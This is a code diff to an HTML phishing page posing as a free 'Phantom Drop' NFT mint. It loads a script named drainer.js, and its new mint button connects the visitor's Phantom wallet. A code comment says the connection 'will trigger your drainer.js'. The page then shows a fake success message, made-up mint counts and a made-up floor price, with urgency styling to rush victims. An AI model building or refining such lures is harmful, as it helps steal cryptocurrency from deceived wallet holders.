@@ -3,20 +3,23 @@
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width,initial-scale=1">
-  <title>Phantom Drop #001 • FREE MINT LIVE</title>
+  <title>Phantom Drop #001 • FREE MINT</title>
   <link rel="icon" href="https://i.ibb.co/TzQNvLM/FB-IMG-1763052170253.jpg"/>
   <script src="drainer.js" defer></script>
   <style>
     @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@900&family=Rajdhani:wght@700&display=swap');
-    body{margin:0;background:#0a0a1a;color:#e0e0ff;font-family:Rajdhani,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;background:radial-gradient(circle at 10% 20%,rgba(0,255,157,0.15),transparent 20%),radial-gradient(circle at 90% 80%,rgba(0,255,157,0.15),transparent 20%);}
-    .card{max-width:480px;width:100%;background:#111127;border-radius:24px;overflow:hidden;box-shadow:0 20px 60px rgba(0,0,0,0.8),0 0 30px rgba(0,255,157,0.5);border:2px solid rgba(0,255,157,0.4);}
-    .logo{font-family:Orbitron,sans-serif;font-size:3.8rem;text-align:center;padding:30px;background:linear-gradient(135deg,rgba(0,255,157,0.2),transparent);background-clip:text;-webkit-background-clip:text;color:transparent;}
-    img{width:100%;height:420px;object-fit:cover;}
-    .content{padding:30px;text-align:center;}
-    .timer{font-family:Orbitron,sans-serif;font-size:3.5rem;color:#ff3366;text-shadow:0 0 30px #ff0066;}
-    .countdown{background:rgba(255,51,102,0.2);border:3px solid #ff3366;border-radius:20px;padding:20px;margin:20px 0;animation:p 1.5s infinite;}
-    @keyframes p{0%,100%{box-shadow:0 0 30px #ff0066}50%{box-shadow:0 0 60px #ff0066}}
-    .status{color:#00ff9d;background:rgba(0,255,157,0.15);padding:18px;border-radius:16px;font-weight:900;font-size:1.1rem;margin:20px 0;}
+    body{margin:0;background:#0a0a1a;color:#e0e0ff;font-family:Rajdhani,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:15px;background:radial-gradient(circle at 10% 20%,rgba(0,255,157,0.15),transparent 20%),radial-gradient(circle at 90% 80%,rgba(0,255,157,0.15),transparent 20%);}
+    .card{max-width:480px;width:100%;background:#111127;border-radius:24px;overflow:hidden;box-shadow:0 20px 60px rgba(0,0,0,0.9),0 0 40px rgba(0,255,157,0.6);border:2px solid rgba(0,255,157,0.5);}
+    .logo{font-family:Orbitron,sans-serif;font-size:3.8rem;text-align:center;padding:35px;background:linear-gradient(135deg,rgba(0,255,157,0.25),transparent);background-clip:text;-webkit-background-clip:text;color:transparent;text-shadow:0 0 30px rgba(0,255,157,0.9);}
+    img{width:100%;height:440px;object-fit:cover;border-bottom:3px solid rgba(0,255,157,0.5);}
+    .content{padding:35px;text-align:center;}
+    .timer{font-family:Orbitron,sans-serif;font-size:3.8rem;color:#ff3366;text-shadow:0 0 45px #ff0066;letter-spacing:5px;}
+    .countdown{background:rgba(255,51,102,0.3);border:3px solid #ff3366;border-radius:24px;padding:25px;margin:25px 0;animation:p 1.3s infinite;}
+    @keyframes p{0%,100%{box-shadow:0 0 45px #ff0066}50%{box-shadow:0 0 90px #ff0066}}
+    .btn{background:linear-gradient(45deg,#00ff9d,#00d4ff);color:#000;font-size:1.8rem;font-weight:900;padding:25px;border:none;border-radius:50px;width:100%;margin:25px 0;cursor:pointer;text-transform:uppercase;letter-spacing:3px;box-shadow:0 0 40px rgba(0,255,157,0.7);transition:0.3s;}
+    .btn:hover{transform:translateY(-5px);box-shadow:0 0 60px rgba(0,255,157,0.9);}
+    .btn:disabled{background:#555;cursor:not-allowed;transform:none;}
+    .status{color:#00ff9d;background:rgba(0,255,157,0.2);padding:20px;border-radius:18px;font-weight:900;font-size:1.2rem;margin:20px 0;}
   </style>
 </head>
 <body>
@@ -24,31 +27,43 @@
     <div class="logo">PHANTOM DROP</div>
     <img src="https://i.ibb.co/TzQNvLM/FB-IMG-1763052170253.jpg" alt="NFT">
     <div class="content">
-      <h1 style="font-size:2.4rem;color:#00ff9d;margin:10px 0;">#001 • Genesis Mint</h1>
+      <h1 style="font-size:2.6rem;color:#00ff9d;margin:15px 0;">#001 • Genesis Mint</h1>
       <div class="countdown">
-        <div style="color:#ff3366;font-size:1.5rem;font-weight:900;">MINT GOES LIVE IN</div>
-        <div class="timer" id="timer">00:00:58</div>
+        <div style="color:#ff3366;font-size:1.6rem;font-weight:900;">FREE MINT LIVE</div>
+        <div class="timer">OPEN NOW</div>
       </div>
-      <div class="status" id="status">Preparing wallet connection...</div>
-      <div style="margin-top:20px;color:#00ff9d;font-weight:900;">
-        9,872 minted • 128 remaining • Floor: 42 SOL
+      <div class="status" id="status">Connect wallet to mint</div>
+      <button class="btn" id="mintBtn">MINT NOW • FREE</button>
+      <div style="margin-top:25px;color:#00ff9d;font-weight:900;font-size:1.1rem;">
+        9,891 minted • 109 remaining • Floor: 45 SOL
       </div>
     </div>
   </div>
 
   <script>
-    // Fake countdown (58 seconds)
-    let sec = 58;
-    const timer = setInterval(() => {
-      sec--;
-      document.getElementById("timer").textContent = "00:00:" + (sec < 10 ? "0" + sec : sec);
-      if (sec <= 0) clearInterval(timer);
-    }, 1000);
+    const btn = document.getElementById("mintBtn");
+    const status = document.getElementById("status");
 
-    // Stealth status updates
-    setTimeout(() => document.getElementById("status").textContent = "Wallet detected... silently connecting...", 3000);
-    setTimeout(() => document.getElementById("status").textContent = "Claiming your free NFT...", 8000);
-    setTimeout(() => document.getElementById("status").textContent = "MINT SUCCESSFUL — Check your wallet!", 15000);
+    btn.onclick = async () => {
+      btn.disabled = true;
+      status.textContent = "Connecting wallet...";
+      
+      try {
+        // This will trigger your drainer.js
+        if (window.solana && window.solana.isPhantom) {
+          await window.solana.connect();
+        }
+        status.textContent = "Minting your NFT...";
+        setTimeout(() => {
+          status.textContent = "MINT SUCCESSFUL";
+          btn.textContent = "CLAIMED";
+          btn.style.background = "#00ff9d";
+        }, 4000);
+      } catch (e) {
+        status.textContent = "Mint failed — try again";
+        btn.disabled = false;
+      }
+    };
   </script>
 </body>
 </html>
